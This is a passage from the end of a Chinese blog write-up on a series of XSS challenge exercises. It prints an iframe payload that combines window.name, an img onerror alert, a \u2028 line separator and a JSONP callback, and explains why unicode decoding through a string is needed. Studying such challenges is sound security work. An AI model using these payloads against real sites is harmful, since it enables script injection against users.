<li><strong>自己回头看了看又奇怪，自己给自己提问：为什么如下payload不能弹框呢？</strong></li>
</ol>
<pre><code class="language-html">&lt;iframe id=&quot;lala&quot; name=&quot;&lt;img src=x onerror=alert(1)&gt;&quot; src=&quot;http://px1624.sinaapp.com/test/xsstest6/??\u2028&amp;uin=../test/xsstest6/user.php?callback=$(name)&quot;&gt;&lt;/iframe&gt;
</code></pre>
<p>src的内容放下面不是多此一举嘛，直接提上来呗？</p>
<p>但是这样是不可以弹框的。</p>
<p>原因在于之前我们尝试在URL中直接访问上面src中的连接访问希望浏览器会解析我们的\u2028。但是浏览器会直接把\u2028当作6个字符，而不会把他当作一个unicode编码，所以我们需要引入一个<strong>字符串</strong>来先解析这个unicode编码，然后让浏览器访问。</p>
<p>之前我们是使用<code>location=&quot;&quot;</code>的形式，这样我们的地址就会在字符串中走一遍被unicode解析然后跳转。</p>
<p>同理现在是iframe的src，我们也通过一个字符串赋值的操作，来先解析\u2028，然后再访问。如果有疑问可以尝试打开，然后看网络访问情况就可以看到区别。</p>
<p>完美完结了一半</p>
<h2 id="参考">参考</h2>
<ol>
<li>https://mp.weixin.qq.com/s/MNP1PW0bi0aL7dRr1aa2Tg</li>
<li>https://mp.weixin.qq.com/s/T44dQckTjc0M1loRzTRH0A</li>
<li>https://mp.weixin.qq.com/s/jx-UWFfSPOVPhWLsvGxPcw</li>
<li>https://mp.weixin.qq.com/s/Q976z2ryfkEJQiSyl8aH8g</li>
<li>https://mp.weixin.qq.com/s/Nxjn_SUAfrB-K5z6YdlW8g</li>
</ol>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
<li><a href="#%E7%AC%AC%E4%B8%80%E9%A2%98">第一题</a></li>
<li><a href="#%E7%AC%AC%E4%BA%8C%E9%A2%98">第二题</a>
<ul>
<li><a href="#constructor%E7%9A%84%E8%A7%A6%E5%8F%91%E5%8E%9F%E7%90%86">constructor的触发原理</a></li>
<li><a href="#%E9%A2%98%E5%A4%96%E8%AF%9D%E5%88%A9%E7%94%A8constructor%E6%9E%84%E9%80%A0%E5%BC%B9%E6%A1%86">题外话：利用constructor构造弹框</a></li>
</ul>
</li>
<li><a href="#%E7%AC%AC%E4%B8%89%E9%A2%98">第三题</a>
<ul>
<li><a href="#%E4%BD%BF%E7%94%A8%E6%B3%A8%E9%87%8A">使用注释</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E8%BF%90%E7%AE%97%E7%AC%A6%E5%AE%98%E6%96%B9%E8%A7%A3%E6%B3%95">使用运算符（官方解法）</a></li>
</ul>
</li>
<li><a href="#%E7%AC%AC%E5%9B%9B%E9%A2%98">第四题</a>
<ul>
<li><a href="#%E6%B3%A8%E9%87%8A%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2">注释进阶：使用模板字符串</a></li>
<li><a href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E8%BF%9B%E9%98%B6%E6%9B%B4%E5%A4%9A%E7%9A%84%E8%BF%90%E7%AE%97%E7%AC%A6">运算符进阶：更多的运算符</a></li>
</ul>
</li>
<li><a href="#%E7%AC%AC%E4%BA%94%E9%A2%98">第五题</a></li>
<li><a href="#%E7%AC%AC%E5%85%AD%E9%A2%98">第六题</a>
<ul>
<li><a href="#%E6%AD%A3%E5%88%99-%E4%B8%8D%E5%8C%B9%E9%85%8D%E7%9A%84%E5%AD%97%E7%AC%A6%E5%88%B0%E5%BA%95%E6%9C%89%E5%95%A5">正则 . 不匹配的字符到底有啥</a></li>
<li><a href="#test6%E4%BD%9C%E4%B8%BA%E8%A7%A6%E5%8F%91%E5%99%A8-">test6作为触发器-$()</a>
<ul>
<li><a href="#iframe%E7%9A%84windowname%E8%B7%A8%E5%9F%9F%E4%BC%A0%E8%BE%93">iframe的window.name跨域传输</a></li>
<li><a href="#%E6%8B%B7%E9%97%AE">拷问</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">下一篇</div>
            <a href="https://blog.xray.cool/post/cve-2020-14882&amp;&amp;cve-2020-14883/">
              <h3 class="post-title">
                CVE-2020-14882&amp;CVE-2020-14883分析
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  
  <a class="rss" href="https://blog.xray.cool/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
